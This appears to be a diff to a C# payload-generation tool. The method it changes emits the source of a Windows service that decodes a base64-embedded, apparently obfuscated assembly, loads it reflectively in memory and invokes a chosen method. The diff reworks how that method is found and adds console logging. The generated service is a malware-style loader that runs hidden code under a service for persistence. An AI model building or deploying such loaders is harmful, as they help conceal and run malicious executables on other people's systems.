@@ -767,6 +767,8 @@ using System.Runtime.InteropServices;
 
     public string GenerateServiceRunnerCsFile(string aGuid, string projDir, string bin64)
     {
+      // whacky program that tries to find reflectively load obfuscated exe and find Execute() ("A.A.A")
+      // Have to deal with ambigous method names.
       var content = String.Format(@"
 using System;
 using System.Collections.Generic;
@@ -795,9 +797,21 @@ namespace {2}
             byte[] data = System.Convert.FromBase64String(""{7}"");
             Assembly a = Assembly.Load(data);
             Type myType = a.GetType(TargetAssemblyName);
-            MethodInfo myMethod = myType.GetMethod(TargetMethodName);
-            object obj = Activator.CreateInstance(myType);
-            myMethod.Invoke(obj, null);
+            Console.WriteLine(""Initializing"");
+            var meths = myType.GetMethods();
+
+            foreach( MethodInfo m in meths)
+            {
+                var attribCount = m.GetCustomAttributes(true).Count();
+                if (m.Name == TargetMethodName && m.IsStatic && m.IsPublic && attribCount == 0)
+                {
+                    Console.WriteLine(""Starting"");
+                    object obj = Activator.CreateInstance(myType);
+                    m.Invoke(obj, null);
+                    break;
+                }
+            }
+            Console.WriteLine(""Done"");
         }}
 
         protected override void OnStop()
